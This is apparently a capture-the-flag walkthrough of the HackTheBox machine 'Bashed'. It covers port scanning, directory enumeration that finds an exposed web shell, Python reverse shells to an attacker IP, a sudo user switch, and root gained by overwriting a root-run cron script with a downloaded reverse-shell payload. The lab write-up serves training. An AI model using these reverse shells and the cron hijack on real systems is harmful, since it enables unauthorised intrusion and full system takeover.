1. Enumeration

I started with a full port scan using Nmap:

sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.10.68
  • -p- --open: Scans all 65535 ports, showing only open ones.
  • -sS: Stealth SYN scan.
  • -Pn -n: Skips host discovery and DNS resolution for speed.

Only port 80 was open. Service scan:

nmap -sC -sV -p80 10.10.10.68
  • -sC: Runs default scripts.
  • -sV: Enumerates for the version running.

The domain is bashed.htb. I updated my /etc/hosts:

echo "10.10.10.68 bashed.htb" | sudo tee -a /etc/hosts

Next step is directory enumeration:

gobuster dir --url "http://10.10.10.68/" -w /usr/share/dirb/wordlists/small.txt

Discovered /dev/phpbash.php—a web shell. We can find the user flag at the arrexel's home directory.

2. Privilege Escalation

To get a proper shell, I started a listener on my machine:

nc -lvnp 1234

Executed a Python reverse shell from the web UI:

python -c 'import socket,subprocess,os; \ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \ s.connect(("10.10.14.17",1234)); \ os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \ p=subprocess.call(["/bin/sh","-i"]);'

I upgraded my shell

python -c 'import pty; pty.spawn("/bin/bash")'

Checking sudo permissions:

sudo -l

We can run commands as scriptmanager without a password. Switching users:

sudo -i -u scriptmanager

Inside /scripts, I found test.py which is executed by root.

I created a new test.py to my machine and replaced the old one with my new one.

import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(("10.10.14.17",9002)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty; pty.spawn("sh") ## This is the new test.py with my IP

I opened a new listener to port 9002 and I opened a http server.

python3 -m http.server 8000

From the reverse shell I downloaded the new test.py.

wget http://10.10.14.17:8000/test.py -O /scripts/test.py

I have to change permissions to be accessible through everyone.

chmod 777 test.py

After a minute, the cronjob executed the script and granted root access.
